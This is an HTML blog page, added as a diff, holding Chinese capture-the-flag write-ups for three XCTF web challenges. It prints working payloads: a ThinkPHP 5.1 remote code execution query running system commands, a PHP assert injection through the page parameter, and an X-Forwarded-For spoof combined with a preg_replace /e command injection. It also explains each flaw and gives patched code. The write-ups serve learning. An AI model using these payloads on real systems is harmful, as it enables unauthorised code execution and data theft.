@@ -1,0 +1,948 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    攻防世界-web |
+    
+    Flight-star&#39;blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="（在朋友的推荐下，我选择了攻防世界） php_rce考察点：ThinkPHP 5.1框架的远程代码执行漏洞（RCE） 举例子代码： 1?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id  一、原理解析：漏洞是如何触发的？1. 参数拆解 s&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界-web">
+<meta property="og:url" content="http://example.com/2025/03/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/index.html">
+<meta property="og:site_name" content="Flight-star&#39;blog">
+<meta property="og:description" content="（在朋友的推荐下，我选择了攻防世界） php_rce考察点：ThinkPHP 5.1框架的远程代码执行漏洞（RCE） 举例子代码： 1?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id  一、原理解析：漏洞是如何触发的？1. 参数拆解 s&#x3D;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image-20250324105301941-1742784782888-12.png">
+<meta property="og:image" content="http://example.com/images/image-20250324225137226-1742827898128-7.png">
+<meta property="og:image" content="http://example.com/images/image-20250324225123213-1742827884006-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250324225341113-1742828022365-9.png">
+<meta property="og:image" content="http://example.com/images/image-20250324231331198-1742829212569-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250324231406833-1742829248425-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250324231218454-1742829140485-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250325124920827-1742878162306-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250325125243815-1742878364829-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250326123638784-1742963799655-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250326123841311-1742963922210-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250326154941233-1742975382279-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250328130926750-1743138567595-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250328175909797-1743155951017-9.png">
+<meta property="og:image" content="http://example.com/images/image-20250328190215212-1743159736210-11.png">
+<meta property="og:image" content="http://example.com/images/image-20250328192024117-1743160825441-13.png">
+<meta property="article:published_time" content="2025-03-23T09:39:50.000Z">
+<meta property="article:modified_time" content="2025-03-28T11:30:33.276Z">
+<meta property="article:author" content="Flight-star">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20250324105301941-1742784782888-12.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Flight-star'blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">Friend</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="攻防世界-web">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">攻防世界-web</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-攻防世界-web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/03/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-03-23T09:39:50.000Z" itemprop="datePublished">2025-03-23</time>
+    <time style="display: none;" id="post-update-time">2025-03-28</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p> <strong>（在朋友的推荐下，我选择了攻防世界）</strong></p>
+<h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a><code>php_rce</code></h1><p>考察点：<font color="red">ThinkPHP 5.1框架的<strong>远程代码执行漏洞（RCE）</strong></font></p>
+<p>举例子代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">id</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="一、原理解析：漏洞是如何触发的？"><a href="#一、原理解析：漏洞是如何触发的？" class="headerlink" title="一、原理解析：漏洞是如何触发的？"></a><strong>一、原理解析：漏洞是如何触发的？</strong></h3><h4 id="1-参数拆解"><a href="#1-参数拆解" class="headerlink" title="1. 参数拆解"></a><strong>1. 参数拆解</strong></h4><ul>
+<li><strong><code>s=index/\think\app/invokefunction</code></strong><br>表示调用 <code>think\App</code> 类的 <code>invokefunction</code> 方法。ThinkPHP的路由解析允许通过URL参数直接指定类和方法，这是漏洞的入口。</li>
+</ul>
+<h4 id="2-function-call-user-func-array"><a href="#2-function-call-user-func-array" class="headerlink" title="2. function=call_user_func_array"></a><strong>2. <code>function=call_user_func_array</code></strong></h4><p>指定要执行的回调函数为 <code>call_user_func_array</code>，这是PHP中用于调用用户自定义函数或系统函数的工具。</p>
+<h4 id="3-vars-0-system-和-vars-1-id"><a href="#3-vars-0-system-和-vars-1-id" class="headerlink" title="3. vars[0]=system 和 vars[1][]=id"></a><strong>3. <code>vars[0]=system</code> 和 <code>vars[1][]=id</code></strong></h4><ul>
+<li><code>vars[0]</code>：回调函数的名称（这里是系统命令执行函数 <code>system</code>）。</li>
+<li><code>vars[1][]</code>：传递给回调函数的参数（这里是要执行的命令 <code>id</code>）。</li>
+</ul>
+<p><strong>整体逻辑</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>));  <span class="comment">// 实际执行的PHP代码</span></span><br></pre></td></tr></table></figure>
+
+<p>相当于在服务器上执行 <code>id</code> 命令，返回当前用户信息。</p>
+<p>改代码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">cat</span>+/<span class="title">flag</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><code>mfw</code></h1><p>考察点：<font color="red">Git源码泄露,PHP 代码注入漏洞</font></p>
+<h3 id="1-信息收集，扫描网站发现有大量的git文件，应该是Git文件泄露"><a href="#1-信息收集，扫描网站发现有大量的git文件，应该是Git文件泄露" class="headerlink" title="1.信息收集，扫描网站发现有大量的git文件，应该是Git文件泄露"></a>1.信息收集，扫描网站发现有大量的git文件，应该是Git文件泄露</h3><p><img src="/../images/image-20250324105301941-1742784782888-12.png" alt="image-20250324105301941"></p>
+<h3 id="2-githacker？"><a href="#2-githacker？" class="headerlink" title="2.githacker？"></a>2.githacker？</h3><p>下载了一个早上，老是不行，你奶奶的</p>
+<h3 id="3-直接看wp："><a href="#3-直接看wp：" class="headerlink" title="3.直接看wp："></a>3.直接看wp：</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里会对file进行第一次检查：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们只需要截断注入就行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:/?page=<span class="string">&#x27;).system(&quot;cat ./templates/flag.php&quot;);//</span></span><br></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<h4 id="文件路径构建"><a href="#文件路径构建" class="headerlink" title="文件路径构建"></a>文件路径构建</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>$file</code> 的值变为 <code>templates/&#39;).system(&quot;cat ./templates/flag.php&quot;);//.php</code>。</p>
+<h4 id="第一次-assert-检查"><a href="#第一次-assert-检查" class="headerlink" title="第一次 assert 检查"></a>第一次 <code>assert</code> 检查</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>将 <code>$file</code> 的值代入后，<code>assert</code> 函数实际执行的代码是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;templates/&#x27;</span>).<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./templates/flag.php&quot;</span>);<span class="comment">//.php&#x27;, &#x27;..&#x27;) === false</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的单引号被攻击者传入的 <code>&#39;</code> 闭合，<code>).system(&quot;cat ./templates/flag.php&quot;);</code> 成为了可执行的 PHP 代码。<code>strpos</code> 函数被中断，转而执行 <code>system(&quot;cat ./templates/flag.php&quot;)</code>，该命令会在服务器上执行 <code>cat</code> 命令，读取 <code>./templates/flag.php</code> 文件的内容。</p>
+<h3 id="4-改进代码"><a href="#4-改进代码" class="headerlink" title="4.改进代码"></a>4.改进代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    <span class="comment">// 过滤非法字符</span></span><br><span class="line">    <span class="variable">$page</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否存在且不包含非法路径</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;..&#x27;</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载文件</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="安全改进点"><a href="#安全改进点" class="headerlink" title="安全改进点"></a>安全改进点</h3><h4 id="1-输入过滤"><a href="#1-输入过滤" class="headerlink" title="1. 输入过滤"></a>1. 输入过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$page</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$page</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这行代码使用正则表达式对用户输入的 <code>$page</code> 参数进行过滤，只允许字母、数字和下划线，会把其他非法字符都替换为空字符串。这样做可以有效防止攻击者通过构造特殊字符（如单引号、括号等）来进行代码注入攻击，大大降低了代码注入漏洞的风险。</p>
+<h4 id="2-避免使用-assert-函数"><a href="#2-避免使用-assert-函数" class="headerlink" title="2. 避免使用 assert 函数"></a>2. 避免使用 <code>assert</code> 函数</h4><p>原代码使用 <code>assert</code> 函数执行字符串代码，容易引发代码注入问题。而此代码直接使用条件判断语句来检查文件路径是否包含非法字符和文件是否存在，避免了执行恶意代码的风险。</p>
+<h4 id="3-路径检查"><a href="#3-路径检查" class="headerlink" title="3. 路径检查"></a>3. 路径检查</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;..&#x27;</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这行代码检查文件路径中是否包含 <code>..</code>，因为 <code>..</code> 常用于目录遍历攻击，通过检查可以防止攻击者通过构造路径来访问系统的其他目录，增强了对目录遍历攻击的防范能力。</p>
+<h4 id="4-文件存在性检查"><a href="#4-文件存在性检查" class="headerlink" title="4. 文件存在性检查"></a>4. 文件存在性检查</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在加载文件之前，先使用 <code>file_exists</code> 函数检查文件是否存在。若文件不存在，就终止程序并给出相应提示，避免了因加载不存在的文件而可能引发的错误，同时也防止攻击者通过构造不存在的文件路径进行攻击。</p>
+<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a><code>ics-05</code></h1><p>考察点：<font color="red">SSRF伪协议，ip伪造</font></p>
+<p>题目提醒我们在维护中心</p>
+<p><img src="/../images/image-20250324225137226-1742827898128-7.png" alt="image-20250324225137226"></p>
+<p>于是我们点进去，打开源码发现：</p>
+<p><img src="/../images/image-20250324225123213-1742827884006-5.png" alt="image-20250324225123213"></p>
+<h3 id="可能是文件包含漏洞！"><a href="#可能是文件包含漏洞！" class="headerlink" title="可能是文件包含漏洞！"></a><strong>可能是文件包含漏洞！</strong></h3><p>我们尝试<code>filiter</code>，base64读取<code>index.php</code>：</p>
+<p><img src="/../images/image-20250324225341113-1742828022365-9.png" alt="image-20250324225341113"></p>
+<p>解密后得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="代码注入漏洞"><a href="#代码注入漏洞" class="headerlink" title="代码注入漏洞"></a>代码注入漏洞</h3><p>当使用 <code>preg_replace</code> 的 <code>/e</code> 修饰符时，就会出现代码注入漏洞。该修饰符的作用是让替换后的字符串当作 PHP 代码来执行。要是用户能够控制替换字符串或者正则表达式模式，那么他们就能注入并执行任意的 PHP 代码。</p>
+<p>我们先打开BP抓包，伪造IP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="构造代码："><a href="#构造代码：" class="headerlink" title="构造代码："></a>构造代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//61.147.171.105:59143/index.php?pat=/.*/e&amp;rep=system(&quot;find+/+-name+flag*&quot;)&amp;sub=test</span></span><br></pre></td></tr></table></figure>
+
+<p>来寻找flag得到：</p>
+<p><img src="/../images/image-20250324231331198-1742829212569-3.png" alt="image-20250324231331198"></p>
+<p>发现：</p>
+<p><img src="/../images/image-20250324231406833-1742829248425-5.png" alt="image-20250324231406833"></p>
+<p>（为什么选择它？它比较短……）</p>
+<h3 id="最终payload："><a href="#最终payload：" class="headerlink" title="最终payload："></a>最终payload：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=/.*/e&amp;rep=<span class="title function_ invoke__">system</span>(<span class="string">&quot;more+/var/www/html/s3chahahaDir/flag/flag.php&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<p><img src="/../images/image-20250324231218454-1742829140485-1.png" alt="image-20250324231218454"></p>
+<h4 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.<strong>漏洞原理</strong></h4><h5 id="1-PHP的preg-replace函数与-e修饰符"><a href="#1-PHP的preg-replace函数与-e修饰符" class="headerlink" title="(1) PHP的preg_replace函数与/e修饰符"></a>(1) <strong>PHP的<code>preg_replace</code>函数与<code>/e</code>修饰符</strong></h5><ul>
+<li><p><strong><code>preg_replace</code></strong> 函数用于执行正则表达式替换，语法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace($pattern, $replacement, $subject);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>/e</code> 修饰符</strong>：当正则模式中包含此修饰符时，<code>$replacement</code> 字符串会被当作 <strong>PHP代码</strong> 执行（仅在PHP &lt; 5.5.0中有效，高版本已废弃）。</p>
+</li>
+</ul>
+<h5 id="2-漏洞代码示例"><a href="#2-漏洞代码示例" class="headerlink" title="(2) 漏洞代码示例"></a>(2) <strong>漏洞代码示例</strong></h5><p>假设后端存在以下危险代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$pattern = $_GET[&#x27;pat&#x27;];  // 用户可控的正则模式</span><br><span class="line">$replacement = $_GET[&#x27;rep&#x27;];  // 用户可控的替换内容</span><br><span class="line">$subject = $_GET[&#x27;sub&#x27;];  // 用户可控的输入数据</span><br><span class="line"></span><br><span class="line">// 执行正则替换，若$pattern包含/e修饰符，$replacement会被执行</span><br><span class="line">echo preg_replace($pattern, $replacement, $subject);</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-攻击参数构造"><a href="#3-攻击参数构造" class="headerlink" title="(3) 攻击参数构造"></a>(3) <strong>攻击参数构造</strong></h5><p>你的请求参数为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pat=/.*/e</span><br><span class="line">rep=system(&quot;find+/+-name+flag*&quot;)</span><br><span class="line">sub=test</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>/.\*/e</code>**：正则模式解释：<ul>
+<li><code>/.*/</code>：匹配任意字符（包括换行符，因未用<code>/s</code>修饰符）。</li>
+<li><code>/e</code>：关键修饰符，启用代码执行模式。</li>
+</ul>
+</li>
+<li><strong>替换逻辑</strong>：<ul>
+<li><code>preg_replace</code> 会匹配 <code>$subject</code>（值为<code>test</code>）中的 <code>.*</code>（即整个字符串），然后执行替换。</li>
